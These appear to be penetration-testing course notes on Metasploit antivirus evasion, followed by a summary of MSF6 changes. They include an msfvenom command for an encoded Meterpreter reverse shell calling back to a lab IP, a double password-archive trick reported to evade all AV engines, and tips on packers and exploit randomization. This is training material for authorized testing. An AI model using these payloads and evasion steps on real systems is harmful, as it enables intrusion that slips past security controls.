A payload inside a password-protected archive bypasses most AV signature scanning because the engine can't read the contents. Double-archive + remove extension for maximum effect:
```bash
# Generate payload
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 \
  -k -e x86/shikata_ga_nai -a x86 --platform windows \
  -o ~/test.js -i 5

# First archive with password
rar a ~/test.rar -p ~/test.js   # enter password when prompted

# Remove extension
mv test.rar test

# Archive again with password
rar a test2.rar -p test

# Remove extension again
mv test2.rar test2
```

## Detection comparison
- Raw encoded payload (`test.js`): **11/59** detected
- Double-archived, no extension (`test2`): **0/49** detected

Check against VirusTotal:
```
msf-virustotal -k <API key> -f test2
```

## Evasion Technique 3 - Packers
**Packers** compress and encrypt an executable, wrapping it with decompression code. At runtime the original binary is restored transparently — AV sees only the compressed blob.

Popular packers: UPX, Enigma Protector, MPRESS, Themida, MEW.

## Evasion Technique 4 - Exploit Code Randomization
For custom Buffer Overflow exploits, hardcoded hex patterns are easily flagged by IDS/IPS. Add randomization via `Offset` in the module targets:
```bash
'Targets' =>
[
  [ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29, 'Offset' => 5093 } ],
],
```

Also avoid predictable NOP sleds (`\x90\x90\x90...`) — IDS/IPS specifically look for these before the shellcode landing zone.

## What MSF6 Already Handles For You
- All Meterpreter communication is **AES-encrypted** — defeats most network-based IDS/IPS
- Meterpreter runs **entirely in memory** — no files on disk to scan after execution
## Key Takeaways
- Encoding alone (SGN) is not enough — modern AV uses heuristics and ML, not just signatures
- The most practical quick-win for evasion is the **double password-protected archive with no extension** — drops detection from 11/59 to 0/49
- Always test payloads in a sandbox before deploying on an engagement — you may only get one shot
- Evasion is a deep topic; this section is just the surface — dedicated evasion modules cover it properly
# Metasploit-Framework Updates - August 2020
## Key changes
### Encryption
- Full end-to-end AES encryption across all 5 Meterpreter implementations: Windows, Python, Java, Mettle, and PHP
- SMBv3 encryption support — increases complexity for signature-based detection on SMB operations

### Payload Generation
- Old static shellcode generation replaced with a **polymorphic randomization routine** — shuffles instructions on every generation, making signature-based detection much harder
- DLLs now resolve functions by **ordinal instead of name** — removes identifiable strings from binaries
- `ReflectiveLoader` export no longer present as readable text in payload binaries
- Meterpreter commands encoded as **integers instead of strings**

### Plugins
- `Mimikatz` extension removed — replaced by its successor **Kiwi**. Calling `load mimikatz` will load Kiwi automatically.

### Compatibility Warning
- MSF5 sessions are incompatible with MSF6
- Payloads generated with MSF5 will not work with MSF6 communication mechanisms

## Module Closing Thoughts
Metasploit's strengths as a framework:

- Excellent for **post-exploitation** and **pivoting**
- Great for **tracking assessment data** via the database
- Highly extensible via plugins and custom modules

Practice recommendations: HTB tagged boxes, any Academy module target, or the **Dante Pro Lab** for pivoting practice.